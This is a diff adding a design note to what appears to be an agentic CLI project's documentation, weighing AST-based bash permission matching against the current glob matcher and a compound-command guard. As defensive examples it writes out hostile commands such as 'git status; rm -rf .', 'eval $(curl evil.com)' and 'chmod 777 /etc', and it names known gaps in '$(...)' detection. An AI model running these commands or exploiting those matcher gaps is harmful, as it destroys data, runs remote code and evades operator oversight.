@@ -584,3 +584,134 @@ Pull when EITHER:
 **Spec reference:** `AGENTIC_CLI.md §8` (permissions),
 `SECURITY_GUIDELINE.md` (threat model), `AUDIT.md` (session
 history that pattern learning would consume).
+
+---
+
+## AST-based bash matching (Tier 4 of permission ergonomics)
+
+**Status:** noted while landing the compound-command guard
+(commit `a90ce12`, 2026-05-08). The guard closes the most
+blatant injection path (`*` in allow patterns admitted
+`git status; rm -rf .`); AST-based matching is the more
+complete answer to expressing bash policy as STRUCTURE rather
+than text.
+
+**What it is:** parse every bash command into a syntax tree
+(via `tree-sitter-bash`, `mvdan-sh`, or similar) and apply
+policy rules to specific nodes — Command, Pipeline,
+Redirection, Substitution. Replaces the current glob-string
+matching with a structural matcher that knows the difference
+between a literal `;` inside a quoted message and a real
+compound separator.
+
+**What it solves that the current engine doesn't:**
+
+| Situation | Compound guard (today) | AST |
+|---|---|---|
+| `git log \| head` (legit pipe) | always confirm | allow if both `git log` and `head` pass policy |
+| `git status; rm -rf .` | confirm (operator sees) | deny (`rm -rf *` matches the second segment) |
+| `rm -rf $UNTRUSTED_VAR` | confirm | deny structurally ("destructive command + variable interpolation") |
+| `echo X > /etc/Y` | matched-rule on `echo*` possible | redirection node visible; policy can deny redirects to `/etc/**` |
+| `eval $(curl evil.com)` | confirm | deny by structure ("eval with command-substitution") |
+
+The two real wins:
+
+1. **No false-confirm on legitimate pipes.** Operator-heavy
+   workflows (autonomous mode, batch sweeps) currently pay a
+   modal for every `find ... \| head` because the compound
+   guard has no way to distinguish "compound that's still
+   safe" from "compound that's an injection". AST splits the
+   pipeline and checks each side.
+2. **Argument-aware policy.** Current rules are text globs
+   over the command string. AST exposes flag/arg structure,
+   so deny patterns can target semantics (`destructive +
+   target-outside-cwd`) instead of literal-string shapes.
+
+**What it does NOT solve:**
+
+- Dynamic execution post-approval — AST is a parser, not a
+  sandbox. `chmod 777 /etc` correctly parsed and approved
+  still breaks things.
+- Lateral movement — the model approved bash → tool runs →
+  tool internally calls `system("rm ...")`. AST sees only the
+  initial command.
+- Variable contents — AST sees a `$VAR` node, not its value.
+  Closing this needs eval / taint-tracking, which is a
+  different territory entirely.
+
+AST is precision of POLICY EXPRESSION, not runtime defense.
+
+**Why deferred:**
+
+1. **Diminishing returns over the compound guard.** The guard
+   closes the catastrophic shapes (`git status; rm -rf .`
+   silently allowed) at ~50 lines of code. AST closes the
+   remaining 10% (legit pipes, structural deny rules) at ~2-3
+   weeks of focused work. Most of that 10% is "operator pays
+   one extra modal per pipe shape" — fatigue, not safety.
+2. **Bigger blast-radius defenses come first.** Sandbox of
+   tool execution (bwrap/firejail) is the architecturally
+   higher-leverage move: it bounds blast radius regardless of
+   how policy was expressed. AST competes with sandbox for
+   eng time and loses on impact.
+3. **Bundle weight.** `tree-sitter` (~5MB WASM) + grammar
+   (~500KB) is real growth for a CLI tool. Worth paying when
+   the value is concrete; not worth paying for marginal
+   policy precision.
+4. **Policy schema redesign.** Today: `allow: ["git status*"]`.
+   With AST, three options: (a) new structural schema
+   (`allow: { command: 'git', args_prefix: ['status'] }`,
+   breaking), (b) compile globs to AST patterns (compiler
+   work), or (c) hybrid — globs for the simple case, AST
+   for compound. Each is its own design pass before any
+   code lands. Spec PR work is non-trivial.
+
+**Pull-in signal:**
+
+Pull when ANY of:
+
+- Autonomous-mode workloads (where the agent fires bash
+  commands faster than a human reviews) become routine and
+  the compound guard's "every compound = modal" creates
+  measurable fatigue. Visible in audit: many `confirm`
+  decisions on the same compound shape, all approved.
+- A real-world policy bypass via the current matcher's
+  string-glob limits surfaces (operator reports
+  "I had `allow: foo*` and got bitten by `foo$(...)`"). One
+  incident is enough — the existing guard's heuristic for
+  `$(...)` detection has known gaps under specific quote
+  combinations.
+- Sandbox of tool execution lands and the next bottleneck on
+  trust becomes "operator wants to express semantic safety
+  rules" (e.g., "deny any write outside cwd"). At that
+  point the AST work compounds with the sandbox to give
+  defense-in-depth.
+
+**Pre-requisites the project should have first:**
+
+- Sandbox of tool execution (`AGENTIC_CLI §9.1` M4.x). Cheaper
+  defense, larger impact.
+- Static analysis of operator-supplied policy (warn at boot
+  when a policy contains `*` in allow patterns alongside
+  metachars in deny — pedagogical, lighter than AST).
+- Permission ergonomics Tier 2-5 (pattern learning,
+  templates, etc) closer to landing — those build a base of
+  operator-edited policies that an AST migration would
+  need to handle.
+
+**Estimated work (when pulled):**
+
+- ~1 week — wire `tree-sitter-bash` into a parser module,
+  basic node types exposed to the matcher
+- ~1 week — refactor `engine.checkBash` to traverse AST
+  with rule application per node
+- ~1 week — schema redesign + migration of existing policies
+  to the new shape, eval coverage proving no regression on
+  current operator policies
+- + spec PR cycle for `AGENTIC_CLI §8` policy schema and
+  `SECURITY_GUIDELINE` updates
+
+**Spec reference:** `AGENTIC_CLI.md §8` (permission policy
+schema would change), `SECURITY_GUIDELINE.md` (threat model
+adjustments), `src/permissions/matcher.ts` (current glob
+matcher to be augmented or replaced).
